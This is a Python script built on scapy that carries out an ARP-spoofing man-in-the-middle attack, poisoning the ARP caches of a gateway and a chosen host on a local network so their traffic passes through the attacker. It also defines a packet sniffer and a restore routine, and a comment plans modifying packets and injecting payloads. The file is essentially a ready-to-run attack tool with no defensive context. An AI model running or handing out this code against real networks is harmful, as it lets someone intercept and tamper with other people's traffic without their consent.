import scapy.all as scapy
from colorama import Fore, Style, init
import time
import threading

init(autoreset=True)  # Initialize colorama for colored output

# Shared flag for graceful shutdown
stop_flag = threading.Event()

def GetMacFromIP(ip):
    # Sends an ARP request to retrieve the MAC address of the target IP
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered, unanswered = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)

    if answered:
        mac = answered[0][1].hwsrc
        return mac  # Return the MAC address of the target IP
    else:
        return None  # No MAC found

def spoof_victim(target_ip, target_mac, spoofed_ip, label):
    # Creates an ARP spoofing packet to associate the target IP with the attacker's MAC address
    ether = scapy.Ether(dst=target_mac)  # Ethernet destination
    arp = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip)

    packet = ether / arp 
    scapy.sendp(packet, verbose=False)

    color = Fore.YELLOW if label == "ROUTER" else Fore.CYAN
    print(color + f"[{label}] Spoofing {target_ip} pretending to be {spoofed_ip}")

def catch_packets(target_ip, spoofed_ip):
    # Sniffs packets and prints the source and destination IP addresses
    print(f"Sniffing IP packets from {target_ip} to {spoofed_ip}... (max 5 packets)")
    scapy.sniff(
        filter=f"host {target_ip} and host {spoofed_ip}",
        store=False,
        count=5,
        prn=lambda pkt: print(pkt.summary())  # NOTE: This is where intercepted packets are printed
    )

def restore_arp_table(target_ip, spoofed_ip, label):
    # Restores the ARP table of the target to its original state.
    dest_mac = GetMacFromIP(target_ip)
    source_mac = GetMacFromIP(spoofed_ip)
    if not dest_mac or not source_mac:
        return

    ether = scapy.Ether(dst=dest_mac)
    arp = scapy.ARP(op=2, pdst=target_ip, hwdst=dest_mac, psrc=spoofed_ip, hwsrc=source_mac)
    scapy.sendp(ether / arp, verbose=False)
    print(Fore.GREEN + f"[{label}] Restoring {target_ip} to its original state.")

def spoof_thread(target_ip, target_mac, spoofed_ip, label):
    """Thread function for ARP spoofing"""
    try:
        while not stop_flag.is_set():
            spoof_victim(target_ip, target_mac, spoofed_ip, label)
            time.sleep(2)
    except Exception as e:
        print(Fore.RED + f"[{label}] Error: {e}")

#NOTE ToAdd: Edit packets before forwarding them to modify data or inject payloads.

if __name__ == "__main__":
    # Router spoofing configuration
    router_target_ip = "192.168.1.1"  # Default gateway IP
    router_spoofed_ip = "192.168.1.123"  # Target IP address to spoof
    
    # Computer spoofing configuration
    computer_target_ip = "192.168.1.123"  # Target IP address to spoof
    computer_spoofed_ip = "192.168.1.1"  # Default gateway IP
    
    try:
        # Get MAC addresses
        router_target_mac = GetMacFromIP(router_target_ip)
        computer_target_mac = GetMacFromIP(computer_target_ip)
        
        if not router_target_mac:
            print(Fore.RED + f"[!] Could not find MAC address for router {router_target_ip}")
            exit(1)
        if not computer_target_mac:
            print(Fore.RED + f"[!] Could not find MAC address for computer {computer_target_ip}")
            exit(1)
        
        print(Fore.GREEN + "[+] Starting MITM attack with dual ARP spoofing...")
        print(Fore.GREEN + f"[+] Router MAC: {router_target_mac}")
        print(Fore.GREEN + f"[+] Computer MAC: {computer_target_mac}")
        print(Fore.YELLOW + "[!] Press CTRL+C to stop and restore ARP tables\n")
        
        # Create and start threads
        router_thread = threading.Thread(
            target=spoof_thread,
            args=(router_target_ip, router_target_mac, router_spoofed_ip, "ROUTER"),
            daemon=True
        )
        
        computer_thread = threading.Thread(
            target=spoof_thread,
            args=(computer_target_ip, computer_target_mac, computer_spoofed_ip, "COMPUTER"),
            daemon=True
        )
        
        router_thread.start()
        computer_thread.start()
        
        # Keep main thread alive
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            pass
            
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(Fore.RED + f"[!] Error: {e}")
    finally:
        print(Fore.RED + "\n[!] Detected CTRL+C. Stopping threads and restoring ARP tables... Please wait.")
        stop_flag.set()
        
        # Wait for threads to finish
        router_thread.join(timeout=1)
        computer_thread.join(timeout=1)
        
        # Restore ARP tables
        restore_arp_table(router_target_ip, router_spoofed_ip, "ROUTER")
        restore_arp_table(computer_target_ip, computer_spoofed_ip, "COMPUTER")
        
        print(Fore.GREEN + "[+] ARP tables restored. MITM attack stopped.")

